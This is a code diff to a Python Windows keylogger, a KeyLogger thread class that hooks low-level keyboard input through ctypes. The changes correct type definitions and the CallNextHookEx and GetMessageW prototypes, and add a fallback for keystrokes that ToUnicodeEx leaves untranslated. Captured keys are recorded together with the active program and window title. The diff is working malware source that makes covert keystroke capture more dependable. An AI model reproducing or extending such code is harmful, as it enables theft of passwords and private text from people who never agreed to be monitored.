@@ -15,7 +15,7 @@
 #coding: utf-8
 import sys
 from ctypes import *
-from ctypes.wintypes import MSG, DWORD, HINSTANCE, HHOOK, WPARAM, LPARAM, BOOL, LPCWSTR, HMODULE
+from ctypes.wintypes import *
 import threading
 import time
 import datetime
@@ -23,25 +23,21 @@ import platform
 import os
 
 # Base windows types
-BYTE    = c_ubyte
-WORD    = c_ushort
-DWORD   = c_ulong
-WCHAR   = c_wchar
-LRESULT = c_int64 if platform.architecture()[0] == "64bit" else c_long
-WPARAM  = c_uint
-LPARAM  = c_long
+#LRESULT = c_int64 if platform.architecture()[0] == "64bit" else c_long
+#WPARAM  = c_uint
+#LPARAM  = c_long
+ULONG_PTR = WPARAM
+LRESULT = LPARAM
+LPMSG = POINTER(MSG)
+
 HANDLE  = c_void_p
 HHOOK   = HANDLE
 HKL     = HANDLE
+ULONG_PTR = WPARAM
 
 HOOKPROC = WINFUNCTYPE(LRESULT, c_int, WPARAM, LPARAM)
 user32 = windll.user32
 kernel32 = windll.kernel32
-
-#some windows function defines :
-GetModuleHandleW = kernel32.GetModuleHandleW
-GetModuleHandleW.restype = HMODULE
-GetModuleHandleW.argtypes = [LPCWSTR]
 
 # Base constans
 # https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx
@@ -58,17 +54,34 @@ VK_RMENU        = 0xA5 # ALT+GR key
 VK_RETURN       = 0x0D # ENTER key
 VK_ESCAPE       = 0x1B
 
-# Base Win API
+#some windows function defines :
+
+GetModuleHandleW = kernel32.GetModuleHandleW
+GetModuleHandleW.restype = HMODULE
+GetModuleHandleW.argtypes = [LPCWSTR]
+
 SetWindowsHookEx = user32.SetWindowsHookExW
 SetWindowsHookEx.argtypes = (c_int, HOOKPROC, HINSTANCE, DWORD)
 SetWindowsHookEx.restype = HHOOK
 
 UnhookWindowsHookEx = user32.UnhookWindowsHookEx
 CallNextHookEx      = user32.CallNextHookEx
-GetMessage          = user32.GetMessageW
+GetMessageW          = user32.GetMessageW
 GetKeyboardState    = user32.GetKeyboardState
 GetKeyboardLayout   = user32.GetKeyboardLayout
 ToUnicodeEx         = user32.ToUnicodeEx
+
+
+CallNextHookEx.restype = LRESULT
+CallNextHookEx.argtypes = (HHOOK,  # _In_opt_ hhk
+                                    c_int,  # _In_     nCode
+                                    WPARAM, # _In_     wParam
+                                    LPARAM) # _In_     lParam
+
+GetMessageW.argtypes = (LPMSG, # _Out_    lpMsg
+                                HWND,  # _In_opt_ hWnd
+                                UINT,  # _In_     wMsgFilterMin
+                                UINT)  # _In_     wMsgFilterMax
 
 # Macros
 LOWORD = lambda x: x & 0xffff
@@ -80,7 +93,7 @@ class KBDLLHOOKSTRUCT(Structure):
         ('scanCode',    DWORD),
         ('flags',       DWORD),
         ('time',        DWORD),
-        ('dwExtraInfo', POINTER(c_ulong))
+        ('dwExtraInfo', ULONG_PTR)
     ]
 
 # Function prototypes
@@ -127,7 +140,7 @@ class KeyLogger(threading.Thread):
     def run(self):
         self.install_hook()
         msg = MSG()
-        windll.user32.GetMessageA(byref(msg),0,0,0)
+        GetMessageW(byref(msg),0,0,0)
         while not self.stopped:
             time.sleep(1)
         self.uninstall_hook()
@@ -155,7 +168,6 @@ class KeyLogger(threading.Thread):
         self.hooked = None
 
     def hook_proc(self, nCode, wParam, lParam):
-        
         # The keylogger callback
         if LOWORD(wParam) != WM_KEYDOWN and LOWORD(wParam) != WM_SYSKEYDOWN:
             return CallNextHookEx(self.hooked, nCode, wParam, lParam)
@@ -187,14 +199,22 @@ class KeyLogger(threading.Thread):
         elif kbdllhookstruct.vkCode == VK_RETURN:
             specialKey = '[RETURN]'
 
-        # if hooked_key:
         hKl = GetKeyboardLayout(0)
         GetKeyboardState(byref(keyState))
-        ToUnicodeEx(kbdllhookstruct.vkCode, kbdllhookstruct.scanCode, byref(keyState), byref(buff), 256, 0, hKl)
-        hooked_key = buff.value.encode('utf8')
+
+        #https://msdn.microsoft.com/en-us/library/windows/desktop/ms646322(v=vs.85).aspx
+        r=ToUnicodeEx(kbdllhookstruct.vkCode, kbdllhookstruct.scanCode, byref(keyState), byref(buff), 256, 0, hKl)
+        if r==0: #nothing written to the buffer
+            try:
+                hooked_key = chr(kbdllhookstruct.vkCode)
+            except:
+                hooked_key = "0x%s"%kbdllhookstruct.vkCode
+        else:
+            hooked_key = buff.value.encode('utf8')
 
         if specialKey:
             hooked_key = specialKey
+
 
         exe, win_title = "unknown", "unknown"
         try:
